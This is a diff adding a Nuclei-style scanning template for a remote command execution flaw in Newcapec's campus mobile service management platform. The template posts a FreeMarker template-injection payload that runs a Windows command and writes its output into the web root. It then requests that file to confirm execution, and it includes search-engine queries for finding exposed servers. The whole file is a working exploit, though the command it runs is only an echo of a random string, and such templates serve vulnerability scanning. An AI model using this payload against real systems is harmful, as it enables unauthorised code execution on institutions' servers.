@@ -1,0 +1,39 @@
+id: newcapec_campusmobile_service_action_rce
+info:
+  name: newcapec_campusmobile_service_action_rce
+  author: suibxx
+  severity: critical
+  description: 新开普掌上校园服务管理平台 service.action 远程命令执行漏洞
+  tags: xinkaipu,rce,newcapec,hw
+  metadata:
+    max-request: 1
+    fofa-query: title="掌上校园服务管理平台"
+    quake-query: app:"掌上校园服务管理平台"
+    verified: true
+variables:
+  payload: '{{rand_base(6)}}'
+  cmd: "echo {{payload}}"
+  name: "{{to_lower(rand_base(5))}}"
+  filename: "{{name}}.txt"
+
+http:
+  - raw:
+      - |
+        POST /service_transport/service.action HTTP/1.1
+        Host: {{Hostname}}
+        
+        {
+            "command": "GetFZinfo",
+            "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\"
+            ?new()>${ex(\"cmd /c {{cmd}} >./webapps/ROOT/{{filename}}\")}"
+        }
+
+      - |
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2, '{{payload}}')"
+# digest: 4a0a0047304502206b5a436844fc7c0a7d480df0aa11d401e46d6370248e583742c4cec5091f40bb022100eeb71950d7cc91b25b181c59128a135676d8a4a7aba6c1f7f8691be87e515b70:6b2dd5af372f02ed15a56faf8ad98cf9
